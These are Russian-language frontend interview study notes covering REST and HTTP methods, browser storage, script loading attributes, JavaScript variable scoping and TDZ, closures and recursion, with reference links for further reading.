До сих пор мы рассматривали сервер как единую сущность. Но его структура куда сложнее. Между ним и клиентом есть несколько промежуточных узлов, выполняющих вспомогательные функции, — **прокси-серверы**.

Они используются для кэширования, обеспечения безопасности, дополнительной обработки данных. Если основных серверов несколько, то дополнительные серверы-балансировщики могут распределять нагрузку между ними и решать, в какой из них направлять запрос:

![](https://skillbox.ru/upload/setka_images/09194607122022_bd473197c461193ea9b6d317f4c236910d065887.png)

_Изображение: Майя Мальгина для Skillbox Media_

Никто из участников цепочки не знает всего пути, который проходит запрос, — только своих «соседей» справа и слева. Ни клиент, ни один из прокси-серверов не знает, к кому он обращается — к основному сервису или к другому прокси. В REST API это работает в обе стороны: никакие серверы (ни основные, ни прокси) не знают, кому отправляют ответ и уходит ли он куда-то дальше.

###### **Код по требованию (необязательно)**

Этот принцип означает, что сервер в ответ на запрос может **отправить исходный код**, который выполняется уже на стороне клиента. Благодаря этому можно передавать целые сценарии. Например, динамические элементы пользовательского интерфейса, написанные на JavaScript.

В REST API требование необязательно, потому что не всем сайтам и сервисам нужно умение работать с готовыми скриптами.


##### graph QL

https://graphql.org/
https://habr.com/ru/articles/765064/
https://gitconnected.com/learn/graphql

##### GET/POST/PUT/DELETE?PATCH

Вот объяснение основных HTTP-методов (**GET, POST, PUT, DELETE, PATCH**) с примерами и сравнением:

---

###### **1. GET (Чтение данных)**
**Для чего:** Запрос данных с сервера (без изменений).  
**Характеристики:**
- Безопасный (не меняет состояние сервера)
- Идемпотентный (повторные запросы дают тот же результат)
- Данные передаются в URL (ограничение длины)
- Кэшируется браузером

**Пример:**  
```http
GET /api/users/123 HTTP/1.1
```
**Ответ:** Данные пользователя с ID 123.

---

###### **2. POST (Создание данных)**
**Для чего:** Отправка данных на сервер (создание нового ресурса).  
**Характеристики:**
- Небезопасный (меняет состояние сервера)
- Неидемпотентный (повторный запрос создаст дубликат)
- Данные передаются в теле запроса (нет ограничения длины)
- Не кэшируется

**Пример:**  
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{"name": "John", "age": 30}
```
**Ответ:** Созданный пользователь с ID 456.

---

###### **3. PUT (Полное обновление)**
**Для чего:** Замена всего ресурса новыми данными.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторный запрос не изменит результат)
- Требует отправки всех полей ресурса

**Пример:**  
```http
PUT /api/users/123 HTTP/1.1
Content-Type: application/json

{"name": "John Updated", "age": 35}
```
**Ответ:** Обновленные данные пользователя (все поля перезаписаны).

---

###### **4. DELETE (Удаление)**
**Для чего:** Удаление ресурса.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторные запросы не изменят результат после первого удаления)

**Пример:**  
```http
DELETE /api/users/123 HTTP/1.1
```
**Ответ:** Код 204 (No Content) при успехе.

---

###### **5. PATCH (Частичное обновление)**
**Для чего:** Изменение отдельных полей ресурса.  
**Характеристики:**
- Небезопасный
- Неидемпотентный (зависит от реализации)
- Отправляются только изменяемые поля

**Пример:**  
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{"age": 40}
```
**Ответ:** Обновленный ресурс (только поле `age` изменено).

---

###### **Сравнение методов**
| Метод   | Идемпотентность | Безопасность | Тело запроса | Использование           |
|---------|-----------------|--------------|--------------|-------------------------|
| GET     | Да              | Да           | Нет          | Получение данных        |
| POST    | Нет             | Нет          | Да           | Создание ресурса        |
| PUT     | Да              | Нет          | Да           | Полная замена ресурса   |
| DELETE  | Да              | Нет          | Нет/Да       | Удаление ресурса        |
| PATCH   | Нет*            | Нет          | Да           | Частичное обновление    |

> *PATCH может быть идемпотентным, если изменения предсказуемы (например, установка значения `age=40`).

---

###### **Когда что использовать?**
- **GET:** Для получения данных (списка пользователей, деталей товара).  
- **POST:** Для создания (новый пользователь, отправка формы).  
- **PUT:** Для полного обновления (замена профиля пользователя).  
- **PATCH:** Для изменения одного поля (например, смена email).  
- **DELETE:** Для удаления (удаление пользователя).

---

###### **Примеры REST API**
```http
GET    /api/books       — список всех книг
POST   /api/books       — добавить новую книгу
GET    /api/books/42    — получить книгу с ID 42
PUT    /api/books/42    — полностью обновить книгу 42
PATCH  /api/books/42    — изменить автора книги 42
DELETE /api/books/42    — удалить книгу 42
```

**Важно:**  
- Для PATCH используйте формат JSON Patch (`Content-Type: application/json-patch+json`), если API поддерживает.  
- PUT и PATCH часто путают: PUT = перезапись всего, PATCH = точечное изменение.

##### Объясните разницу между `cookie`, `sessionStorage` и `localStorage`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-cookie-sessionstorage-%D0%B8-localstorage "Прямая ссылка на объясните-разницу-между-cookie-sessionstorage-и-localstorage")

###### Ссылки[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8-5 "Прямая ссылка на Ссылки")

- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [http://tutorial.techaltum.com/local-and-session-storage.html](http://tutorial.techaltum.com/local-and-session-storage.html)

Вот сравнение **cookie**, **sessionStorage** и **localStorage** — трех основных способов хранения данных в браузере:

---

###### **1. Куки (Cookie)**  
**Хранение:**  
- Сохраняются **на клиенте и сервере** (передаются с каждым HTTP-запросом в заголовках).  
- Объем: **~4 КБ** на домен.  

**Срок жизни:**  
- Задается вручную (например, `expires=Mon, 01-Jan-2024 12:00:00 GMT`).  
- Могут быть **сессионными** (удаляются при закрытии браузера).  

**Доступ:**  
- Через `document.cookie` (строку в формате `key=value`).  
- Сервер может читать/устанавливать куки (заголовки `Set-Cookie` и `Cookie`).  

**Пример:**  
```javascript
// Установка
document.cookie = "username=John; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";

// Чтение
console.log(document.cookie); // "username=John; theme=dark"
```

**Когда использовать:**  
- Для аутентификации (токены).  
- Персонализация (темы, языковые настройки).  

---

###### **2. sessionStorage**  
**Хранение:**  
- Только **на клиенте** (данные не отправляются на сервер).  
- Объем: **~5–10 МБ** на домен (зависит от браузера).  

**Срок жизни:**  
- Удаляется при **закрытии вкладки/браузера**.  

**Доступ:**  
- Через API: `sessionStorage.setItem()`, `sessionStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
sessionStorage.setItem('theme', 'dark');

// Чтение
console.log(sessionStorage.getItem('theme')); // "dark"
```

**Когда использовать:**  
- Временные данные для текущей сессии (например, форма с многостраничным вводом).  

---

###### **3. localStorage**  
**Хранение:**  
- Только **на клиенте** (как `sessionStorage`, но без привязки к сессии).  
- Объем: **~5–10 МБ** на домен.  

**Срок жизни:**  
- Сохраняется **навсегда**, пока не будет очищен вручную или через код.  

**Доступ:**  
- Аналогичен `sessionStorage`: `localStorage.setItem()`, `localStorage.getItem()`.  

**Пример:**  
```javascript
// Сохранение
localStorage.setItem('language', 'ru');

// Чтение
console.log(localStorage.getItem('language')); // "ru"
```

**Когда использовать:**  
- Постоянные настройки пользователя (тема, язык).  
- Кэширование данных для оффлайн-работы.  

---

###### **Сравнительная таблица**
| Характеристика       | Cookie                  | sessionStorage         | localStorage          |
|----------------------|-------------------------|------------------------|-----------------------|
| **Объем**           | ~4 КБ                  | 5–10 МБ               | 5–10 МБ              |
| **Срок жизни**      | Задается вручную       | До закрытия вкладки    | Бессрочно            |
| **Доступ с сервера**| Да (через заголовки)   | Нет                    | Нет                  |
| **API**             | `document.cookie`       | `sessionStorage`       | `localStorage`       |
| **Использование**   | Аутентификация         | Временные данные       | Постоянные данные    |

---

###### **Как выбрать?**  
1. **Нужно отправить данные на сервер?** → `cookie`.  
2. **Хранить данные только в текущей вкладке?** → `sessionStorage`.  
3. **Сохранить настройки пользователя надолго?** → `localStorage`.  

**Важно:**  
- Для безопасности **не храните** пароли/токены в `localStorage` (уязвимо для XSS-атак).  
- Для больших данных (например, кэша) используйте **IndexedDB**.
##### Объясните разницу между `<script>`, `<script async>` и `<script defer>`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-script-script-async-%D0%B8-script-defer "Прямая ссылка на объясните-разницу-между-script-script-async-и-script-defer")

https://developer.mozilla.org/ru/docs/Web/HTML/Reference/Elements/script

https://learn.javascript.ru/script-async-defer

- `<script>` - отрисовка HTML блокируется, скрипт извлекается и выполняется немедленно, отрисовка HTML возобновляется после окончания выполнения скрипта.
- `<script async>` - скрипт будет получен и обработан параллельно с отрисовкой HTML, его выполнение закончится как только это будет возможно (обычно до того, как закончилась отрисовка HTML). Используйте `async` тогда, когда скрипт не зависит от других скриптов на странице, например для аналитики.
- `<script defer>` - скрипт будет получен параллельно с отрисовкой HTML, его выполнение произойдет после того, как вся страница будет загружена. Если таких скриптов несколько, то каждый из них будет исполнятся в том порядке, в котором они расположены в документе. Если скрипту нужен полностью распарсеный DOM, то атрибут `defer` обеспечит уверенность в том, что на момент отработки скрипта весь HTML отрисован. Нет особой разницы со скриптами, расположенными перед тегом `<body>`. Отложенный скрипт не должен содержать `document.write`.

Примечание: Атрибуты `async` и `defer` игнорируются, если у тега `<script>` нет атрибута `src`.

Вот подробное сравнение атрибутов **`async`** и **`defer`** для загрузки скриптов в HTML:

---

###### **1. Обычная загрузка скрипта (без атрибутов)**
```html
<script src="script.js"></script>
```
**Поведение:**
- Браузер **останавливает парсинг HTML**, пока скрипт не загрузится и не выполнится.
- **Блокирующий** процесс рендеринга страницы.

**Когда использовать:**  
Если скрипт критически важен для отображения контента (например, полифиллы для старых браузеров).

---

###### **2. Атрибут `async` (асинхронная загрузка)**
```html
<script async src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Как только скрипт загружен, он **немедленно выполняется**, приостанавливая парсинг HTML.
3. **Порядок выполнения**: Не гарантируется (кто загрузился первым, тот и выполнился).

**Когда использовать:**  
Для независимых скриптов, которые не требуют взаимодействия с DOM (например, аналитика, счетчики).

**Пример:**  
```html
<!-- Google Analytics -->
<script async src="https://www.google-analytics.com/analytics.js"></script>
```

---

###### **3. Атрибут `defer` (отложенная загрузка)**
```html
<script defer src="script.js"></script>
```
**Поведение:**
1. Скрипт загружается **параллельно** с парсингом HTML.
2. Выполняется **после полной загрузки HTML**, перед событием `DOMContentLoaded`.
3. **Порядок выполнения**: Сохраняется (скрипты выполняются в том порядке, в котором объявлены в HTML).

**Когда использовать:**  
Для скриптов, которым нужен доступ к DOM, но которые могут ждать загрузки всей страницы (например, инициализация виджетов).

**Пример:**  
```html
<script defer src="app.js"></script>
<script defer src="widget.js"></script> 
<!-- Гарантировано выполнится после app.js -->
```

---

###### **Сравнительная таблица**
| Характеристика      | Без атрибутов       | `async`                     | `defer`                     |
|---------------------|---------------------|-----------------------------|-----------------------------|
| **Загрузка**        | Блокирует HTML      | Параллельная                | Параллельная                |
| **Выполнение**      | Сразу после загрузки| Сразу после загрузки        | После загрузки HTML         |
| **Порядок**         | По порядку в HTML   | Случайный (кто первый)      | По порядку в HTML           |
| **Влияние на рендер**| Блокирует          | Может блокировать           | Не блокирует               |
| **Использование**   | Критичные скрипты   | Независимые скрипты         | Скрипты, зависящие от DOM  |

---

###### **Как выбрать?**
1. **`async`** – если скрипт **не зависит от DOM** и других скриптов (аналитика, реклама).  
2. **`defer`** – если скрипту **нужен DOM**, но он может подождать (основной код приложения).  
3. **Без атрибутов** – только для скриптов, которые должны выполниться **до отображения страницы** (например, полифиллы).

---

###### **Визуализация загрузки**
```
HTML Parsing: |=============================|
Без атрибутов:   |----загрузка----|выполнение|
async:            |----загрузка----|выполнение| (в случайном порядке)
defer:            |----загрузка----|       |выполнение| (после HTML, по порядку)
```

---

###### **Важно!**
- Для **модульных скриптов** (ES6) используйте `<script type="module">` – они по умолчанию работают как `defer`.
- **Старайтесь избегать** блокирующих скриптов без `async/defer` – они замедляют загрузку страницы.
## JS

##### переменные/ let/const/var
https://doka.guide/js/var-let/
https://learn.javascript.ru/variables#itogo
https://learn.javascript.ru/var

###### **1. Область видимости (Scope)**
|           | `var`                  | `let`/`const`          |
|-----------|------------------------|------------------------|
| **Область** | Function-scoped       | Block-scoped          |
| **Доступ** | Видна во всей функции | Только внутри блока `{}` |

**Пример:**
```javascript
function test() {
  if (true) {
    var a = 1;    // Видна во всей функции
    let b = 2;    // Только внутри if
    const c = 3;  // Только внутри if
  }
  console.log(a); // 1
  console.log(b); // Ошибка: b is not defined
}
```

---

###### **2. Поднятие (Hoisting)**
|           | `var`                  | `let`/`const`          |
|-----------|------------------------|------------------------|
| **Поднятие** | Да (с `undefined`)    | Да (но в "TDZ")       |
| **TDZ**   | Нет                    | Есть (временная мёртвая зона) |

**Пример:**
```javascript
console.log(x); // undefined (var поднято)
var x = 10;

console.log(y); // Ошибка: Cannot access 'y' before initialization
let y = 20;
```

---

###### **3. Переопределение и обновление**
|           | `var`       | `let`       | `const`     |
|-----------|-------------|-------------|-------------|
| **Переопределение** | Можно      | Можно       | Нельзя      |
| **Обновление**   | Можно      | Можно       | Можно*      |

**Пример:**
```javascript
var name = "John";
var name = "Anna"; // OK

let age = 30;
let age = 40; // Ошибка: Identifier 'age' already declared

const pi = 3.14;
pi = 3.1415; // Ошибка: Assignment to constant variable
```
> *`const` запрещает переприсваивание, но можно менять свойства объектов/массивов:
> ```javascript
> const user = { name: "John" };
> user.name = "Anna"; // OK
> ```

---

###### **4. Глобальная видимость**
При объявлении в глобальной области:
- `var` создаёт свойство в `window` (браузер).
- `let`/`const` не добавляются в `window`.

**Пример:**
```javascript
var globalVar = "I'm global";
let globalLet = "I'm global too";

console.log(window.globalVar); // "I'm global"
console.log(window.globalLet); // undefined
```

---

###### **Когда что использовать?**
1. **`const`** – по умолчанию для всех переменных, которые не нужно переопределять.
2. **`let`** – если переменная будет изменяться (счётчики, условия в циклах).
3. **`var`** – почти никогда (устаревший вариант, есть только для обратной совместимости).

**Примеры:**
```javascript
// Хороший стиль:
const API_URL = "https://api.example.com"; // Константа
let isLoading = true;                      // Флаг, который будет меняться

// Плохой стиль:
var counter = 0;                          // Устаревший синтаксис
```

---

###### **Сводная таблица**
| Характеристика       | `var`            | `let`            | `const`          |
|----------------------|------------------|------------------|------------------|
| **Область видимости** | Function-scoped  | Block-scoped     | Block-scoped     |
| **Поднятие**         | Да (с undefined) | Да (в TDZ)       | Да (в TDZ)       |
| **Переопределение**  | Да               | Нет              | Нет              |
| **Изменение значения** | Да              | Да               | Нет*             |
| **Глобальная видимость** | Добавляет в `window` | Не добавляет в `window` | Не добавляет в `window` |

> *Для объектов/массивов, объявленных через `const`, можно менять внутренние свойства.

---

###### **Почему `var` устарел?**
1. **Неочевидная область видимости** (видна во всей функции, а не только в блоке).
2. **Поднятие** может приводить к неожиданным ошибкам.
3. **Загрязнение глобального объекта** (`window` в браузерах).

**Плохой пример с `var`:**
```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // Выведет 3, 3, 3 (из-за function-scoped)
}
// С let выведет 0, 1, 2
```

---

###### **Итог**
- Всегда начинайте с `const`.  
- Используйте `let`, если переменная будет меняться.  
- Избегайте `var` в современном коде.  
- Для объектов/массивов, которые нужно защитить от изменений, используйте `Object.freeze()`:
  ```javascript
  const immutableObj = Object.freeze({ key: 'value' });
  immutableObj.key = 'new'; // Не изменится (в strict mode — ошибка)
  ```

##### **TDZ (Temporal Dead Zone, Временная мёртвая зона)**  

**TDZ** — это период времени, когда переменные `let` и `const` уже существуют в области видимости (благодаря **поднятию**, Hoisting), но к ним **нельзя обратиться** до их объявления.  

---

###### **Как работает TDZ?**
1. **Объявление `let`/`const` поднимается (hoisting)** в начало своей области видимости (блока `{}`).  
2. Но переменная остаётся в **TDZ** до момента её **инициализации** (присваивания значения).  
3. При попытке доступа к переменной в TDZ — **ошибка `ReferenceError`**.  

---

###### 1. Простой пример
```javascript
console.log(x); // ReferenceError: Cannot access 'x' before initialization
let x = 10;
```
- Переменная `x` **поднята**, но находится в TDZ до строки `let x = 10`.  

###### 2. Внутри блока `{}`
```javascript
{
  console.log(y); // ReferenceError: y is not defined
  let y = 20;
}
```
- `y` существует только внутри блока, но до объявления — TDZ.  

###### 3. В цикле
```javascript
for (let i = 0; i < 3; i++) {
  console.log(i); // 0, 1, 2 (нет TDZ, так как i уже инициализирована)
}
```
- В отличие от `var`, `let` в цикле **не выходит за его пределы**.  

---

###### **Чем TDZ отличается от `var`?**
| Особенность      | `var`                          | `let`/`const` (TDZ)          |
|------------------|--------------------------------|-----------------------------|
| **Поднятие**     | Да, с `undefined`              | Да, но нельзя использовать  |
| **Область**      | Function-scoped                | Block-scoped                |
| **Доступ до объявления** | `undefined`            | **Ошибка `ReferenceError`** |

**Пример:**
```javascript
console.log(a); // undefined (var поднят)
var a = 5;

console.log(b); // ReferenceError (let в TDZ)
let b = 10;
```

---

###### **Почему TDZ существует?**
1. **Предотвращение ошибок** — нельзя использовать переменную до её объявления.  
2. **Улучшение отладки** — явная ошибка лучше, чем неожиданное `undefined`.  
3. **Строгая блоковая область видимости** — `let`/`const` ведут себя предсказуемо.  

---

###### **Как избежать TDZ?**
1. **Всегда объявляйте переменные в начале блока**:
   ```javascript
   let x = 10; // Инициализация перед использованием
   console.log(x); // 10
   ```
2. **Не используйте `var`** — он не имеет TDZ, но приводит к путанице.  
3. **Для `const` — всегда задавайте начальное значение**:
   ```javascript
   const PI = 3.14; // Без TDZ, т.к. сразу инициализирована
   ```

---

###### **Примеры, где TDZ важен**
###### 1. В функциях
```javascript
function run() {
  console.log(value); // ReferenceError (TDZ)
  let value = "Hello";
}
run();
```

###### 2. В блоках `if`/`for`
```javascript
if (true) {
  console.log(tmp); // ReferenceError (TDZ)
  let tmp = 123;
}
```

---

###### **Вывод**
- **TDZ** — это механизм, который делает `let`/`const` безопаснее `var`.  
- **Всегда инициализируйте переменные до использования**, чтобы избежать ошибок.  
- **`const` должен иметь значение сразу**, `let` — лучше объявлять заранее.  

**Итоговая таблица:**  

| Особенность         | `var`            | `let`        | `const`      |
| ------------------- | ---------------- | ------------ | ------------ |
| **Поднятие**        | Да (`undefined`) | Да (TDZ)     | Да (TDZ)     |
| **Область**         | Function-scoped  | Block-scoped | Block-scoped |
| **TDZ**             | Нет              | Да           | Да           |
| **Переопределение** | Да               | Нет          | Нет          |
##### В чём разница между `null`, `undefined` и объявленной переменной без начального значения? (`let foo;`)

`null` задаётся переменной явно и означает, что она является объектом, но структура этого объекта ещё не определена. `undefined` присваивается переменной (переменная не декларирует объект), когда она была объявлена, но не было определено её начальное значение. Функция может возвращать `undefined` или `null`. Всё зависит от того, что мы ожидаем в результате работы функции. Если мы ожидаем объект, но по каким-то причинам функция его вернуть не может, то возвращаем `null`. Если функция должна вернуть, например, число (главное, не объект), но не может этого сделать, то она возвращает `undefined`.

Без начального значения можно оставлять только переменную, объявленную через `let` или `var`. Если объявить переменную через `const` и не задать ей начального значения, будет ошибка: `Uncaught SyntaxError: Missing initializer in const declaration`.

Поговорим немного о [приведении типов](https://doka.guide/js/typecasting/). Для начала, пример:

```js

console.log(null + null); // 0
console.log(undefined + undefined); // NaN

```

Почему так?

По [спецификации EcmaScript](https://262.ecma-international.org/7.0/#sec-tonumber)

- `null` во время сложения приводится к нулю;
- `undefined` во время сложения приводится к `NaN`. `NaN` это аббревиатура от "not a number" — не число. Результат арифметической операции равен `NaN`, если во время операции произошла ошибка и ожидаемый числовой результат не может быть выражен числом.

Есть ещё один хитрый пример:

```js

console.log(null + []); // "null"

```

Почему так?

Подсказка, почему так, кроется именно в типе результате: "null" — строка. А не примитивное значение `null`.

JavaScript сначала приводит массив к примитивному значению. Для этого вызывается метод `toString()`, который вызывает метод `join()`. Т.к. массив пустой, то `join()` вернёт пустую строку `""`. А сложение чего-то со строкой в JS возвращает строку. Поэтому `null` уже никуда не приводится, а возращается строка `"null"`.

Немного упомяну и про оператор нулевого слияния (`??`). В выражении между двумя операндами он будет возвращать первый операнд, если он не равен `null` или `undefined`. Можно сказать, что `??` приравнивает смысл `undefined` и `null` к «ничего не содержит», и, в этом случае, кладёт в переменную значение второго операнда.
##### **Замыкания (Closures) в JavaScript**
https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BC%D1%8B%D0%BA%D0%B0%D0%BD%D0%B8%D0%B5_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)
https://learn.javascript.ru/closure
https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Closures

Замыкание — это комбинация **функции** и **лексического окружения**, в котором эта функция была объявлена. Оно позволяет функции **запоминать и получать доступ** к переменным из внешней (родительской) области видимости, даже после того, как родительская функция завершила выполнение.

###### 🔹 **Как работают замыкания?**
1. **Функция внутри функции**  
   Внутренняя функция "запоминает" (имеет доступ к) переменные внешней функции.

2. **Сохранение состояния**  
   Даже после завершения внешней функции, её переменные остаются доступными для внутренней.

---

###### 🔹 **Пример замыкания**
```javascript
function outer() {
  let count = 0; // Локальная переменная внешней функции

  function inner() {
    count++; // Внутренняя функция использует переменную из внешней
    console.log(count);
  }

  return inner; // Возвращаем inner (но не вызываем её!)
}

const counter = outer(); // counter = функция inner + запомненное окружение (count)

counter(); // 1 (count = 0 + 1)
counter(); // 2 (count = 1 + 1)
counter(); // 3 (count = 2 + 1)
```

###### **Что произошло?**
1. `outer()` вызывается и возвращает `inner`.  
2. Переменная `count` **не уничтожается**, потому что `inner` сохраняет ссылку на неё.  
3. Каждый вызов `counter()` изменяет **одну и ту же `count`**.

---

###### 🔹 **Где применяются замыкания?**
###### **1. Создание приватных переменных**
```javascript
function createCounter() {
  let value = 0; // "Приватная" переменная

  return {
    increment() { value++; },
    decrement() { value--; },
    getValue() { return value; }
  };
}

const counter = createCounter();
counter.increment();
console.log(counter.getValue()); // 1
console.log(counter.value); // undefined (нельзя получить напрямую)
```
- `value` нельзя изменить извне, только через методы.

###### **2. Каррирование (частичное применение функций)**
```javascript
function multiply(a) {
  return function(b) {
    return a * b;
  };
}

const double = multiply(2);
console.log(double(5)); // 10 (2 * 5)
```

###### **3. Мемоизация (кэширование результатов)**
```javascript
function memoizedAdd() {
  const cache = {}; // Замыкание сохраняет cache между вызовами

  return function(n) {
    if (n in cache) {
      console.log("Из кэша:", cache[n]);
      return cache[n];
    } else {
      console.log("Вычисление...");
      cache[n] = n + 10;
      return cache[n];
    }
  };
}

const add = memoizedAdd();
console.log(add(5)); // Вычисление... 15
console.log(add(5)); // Из кэша: 15
```

---

###### 🔹 **Как избежать утечек памяти?**
Замыкания сохраняют ссылки на внешние переменные, что может приводить к утечкам памяти, если:
- Объект больше не нужен, но функция внутри замыкания держит ссылку на него.

**Решение:**  
- Явно обнулять ссылки (`someVar = null`).  
- Использовать **WeakMap** или **WeakSet**, если нужно хранить объекты.

---

###### 🔹 **Итог**
✅ **Замыкания** позволяют функциям запоминать внешние переменные.  
✅ Полезны для **приватных данных**, **каррирования**, **мемоизации**.  
⚠️ Могут вызывать **утечки памяти**, если неаккуратно использовать.  

**Пример на практике:**
```javascript
function createTimer() {
  let startTime = Date.now();

  return function() {
    return Date.now() - startTime;
  };
}

const getElapsedTime = createTimer();
setTimeout(() => console.log(getElapsedTime()), 1000); // ~1000 мс
```


[Замыкание](https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BC%D1%8B%D0%BA%D0%B0%D0%BD%D0%B8%D0%B5_\(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5\)) – это функция, которая запоминает свои внешние переменные и может получить к ним доступ. В некоторых языках это невозможно, или функция должна быть написана специальным образом, чтобы получилось замыкание. Но, как было описано выше, в JavaScript, все функции изначально являются замыканиями (есть только одно исключение, про которое будет рассказано в [Синтаксис "new Function"](https://learn.javascript.ru/new-function)).

То есть они автоматически запоминают, где были созданы, с помощью скрытого свойства `[[Environment]]`, и все они могут получить доступ к внешним переменным.

Когда на собеседовании фронтенд-разработчику задают вопрос: «что такое замыкание?», – правильным ответом будет определение замыкания и объяснения того факта, что все функции в JavaScript являются замыканиями, и, может быть, несколько слов о технических деталях: свойстве `[[Environment]]` и о том, как работает лексическое окружение.

Замыкание — это комбинация функции и лексического окружения, в котором эта функция была определена. Другими словами, замыкание даёт вам доступ к [Scope](https://developer.mozilla.org/en-US/docs/Glossary/Scope) внешней функции из внутренней функции. В JavaScript замыкания создаются каждый раз при создании функции, во время её создания.
##### рекурсия
https://learn.javascript.ru/recursion
https://doka.guide/js/recursion/

Рекурсия — это процесс, когда **функция вызывает саму себя** до тех пор, пока не достигнет **базового случая** (условия выхода). Это мощный инструмент для решения задач, которые можно разбить на более мелкие подзадачи того же типа.

###### 🔹 **Как работает рекурсия?**
1. **Рекурсивный случай** — функция вызывает саму себя с изменёнными аргументами.
2. **Базовый случай** — условие, при котором рекурсия останавливается.

###### 🔥 **Простой пример: Факториал**
```javascript
function factorial(n) {
  if (n === 1) return 1; // Базовый случай
  return n * factorial(n - 1); // Рекурсивный вызов
}

console.log(factorial(5)); // 120 (5! = 5 * 4 * 3 * 2 * 1)
```

###### **Что происходит?**
1. `factorial(5)` → `5 * factorial(4)`
2. `factorial(4)` → `4 * factorial(3)`
3. `factorial(3)` → `3 * factorial(2)`
4. `factorial(2)` → `2 * factorial(1)`
5. `factorial(1)` → `1` (базовый случай, рекурсия останавливается)

---

###### 🔹 **Где применяется рекурсия?**
###### **1. Обход древовидных структур (DOM, JSON)**
```javascript
function traverseDOM(node) {
  console.log(node.tagName); // Выводим текущий элемент
  for (const child of node.children) {
    traverseDOM(child); // Рекурсивно обходим детей
  }
}

traverseDOM(document.body); // Обход всего DOM
```

###### **2. Алгоритмы (быстрая сортировка, бинарный поиск)**
```javascript
function binarySearch(arr, target, left = 0, right = arr.length - 1) {
  if (left > right) return -1; // Базовый случай: элемент не найден
  
  const mid = Math.floor((left + right) / 2);
  
  if (arr[mid] === target) return mid; // Нашли элемент
  if (arr[mid] < target) return binarySearch(arr, target, mid + 1, right);
  return binarySearch(arr, target, left, mid - 1);
}

const arr = [1, 3, 5, 7, 9];
console.log(binarySearch(arr, 5)); // 2 (индекс элемента)
```

###### **3. Генерация последовательностей (числа Фибоначчи)**
```javascript
function fibonacci(n) {
  if (n <= 1) return n; // Базовый случай
  return fibonacci(n - 1) + fibonacci(n - 2);
}

console.log(fibonacci(6)); // 8 (0, 1, 1, 2, 3, 5, 8)
```

---

###### 🔹 **Проблемы рекурсии и как их избежать**
###### **1. Переполнение стека (Stack Overflow)**
Если рекурсия слишком глубокая, JavaScript выдаст ошибку:
```javascript
function infiniteRecursion() {
  infiniteRecursion(); // Бесконечный вызов → RangeError
}
```

**Решение:**  
- Использовать **хвостовую рекурсию** (если движок её поддерживает).  
- Переписать алгоритм **итеративно** (через циклы).

###### **2. Медленная работа (например, Фибоначчи)**
Рекурсивный Фибоначчи без оптимизации работает за **O(2ⁿ)**.

**Решение:** **Мемоизация** (кэширование результатов).  
```javascript
const memo = {};

function fibonacciMemo(n) {
  if (n <= 1) return n;
  if (memo[n]) return memo[n]; // Возвращаем кэшированный результат
  
  memo[n] = fibonacciMemo(n - 1) + fibonacciMemo(n - 2);
  return memo[n];
}

console.log(fibonacciMemo(50)); // Быстро, даже для больших n
```

---

###### 🔹 **Рекурсия vs Итерация**
| Критерий          | Рекурсия                  | Итерация (циклы)          |
|-------------------|---------------------------|---------------------------|
| **Читаемость**    | Выше (для некоторых задач)| Ниже                      |
| **Производительность** | Может быть медленнее | Обычно быстрее            |
| **Использование памяти** | Заполняет стек вызовов | Использует меньше памяти  |
| **Где применять** | Деревья, вложенные структуры | Простые линейные задачи |

---

###### 🔹 **Итог**
✅ **Рекурсия** полезна для задач с **вложенной структурой** (деревья, графы).  
⚠️ **Без базового случая** приводит к **бесконечной рекурсии**.  
🚀 **Оптимизация:** мемоизация, хвостовая рекурсия, итеративные решения.  

**Пример хвостовой рекурсии (ES6):**
```javascript
function factorialTail(n, acc = 1) {
  if (n === 1) return acc;
  return factorialTail(n - 1, n * acc); // Хвостовой вызов (оптимизируется в некоторых движках)
}
```

##### this
https://doka.guide/js/function-context/
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this
https://learn.javascript.ru/object-methods
https://habr.com/ru/companies/ruvds/articles/419371/
https://docs.google.com/presentation/d/1LDJMSHmTkrYYdXQCinUIAQ9BMV2jIrctHhMfGSJDlXQ/edit?slide=id.g23ce763670e_0_2#slide=id.g23ce763670e_0_2


##### event loop
https://habr.com/ru/articles/762618/
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Execution_model
https://habr.com/ru/companies/otus/articles/801249/
https://www.youtube.com/watch?v=eiC58R16hb8

##### методы массивов
https://learn.javascript.ru/array-methods
https://habr.com/ru/companies/plarium/articles/483958/
https://doka.guide/js/arrays/
###### **Промисы (Promises) в JavaScript**
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise
https://doka.guide/js/promise/
https://learn.javascript.ru/promise-basics
Промисы — это объекты, представляющие результат **асинхронной операции** (например, запроса к серверу, чтения файла, таймера). Они позволяют удобно работать с асинхронным кодом, избегая "ада колбэков" (callback hell).

---

